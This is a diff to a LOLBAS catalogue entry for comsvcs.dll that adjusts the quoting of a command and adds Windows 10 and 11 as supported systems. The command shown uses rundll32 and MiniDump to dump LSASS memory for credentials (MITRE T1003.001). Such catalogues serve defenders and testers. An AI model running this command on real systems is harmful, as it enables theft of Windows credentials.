@@ -4,13 +4,13 @@ Description: COM+ Services
 Author: LOLBAS Team
 Created: 2019-08-30
 Commands:
-  - Command: rundll32 C:\windows\system32\comsvcs.dll MiniDump "[LSASS_PID] dump.bin full"
+  - Command: rundll32 C:\windows\system32\comsvcs.dll MiniDump [LSASS_PID] dump.bin full
     Description: Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump.
     Usecase: Dump Lsass.exe process memory to retrieve credentials.
     Category: Dump
     Privileges: SYSTEM
     MitreID: T1003.001
-    OperatingSystem: Windows
+    OperatingSystem: Windows 10, Windows 11
 Full_Path:
   - Path: c:\windows\system32\comsvcs.dll
 Code_Sample:
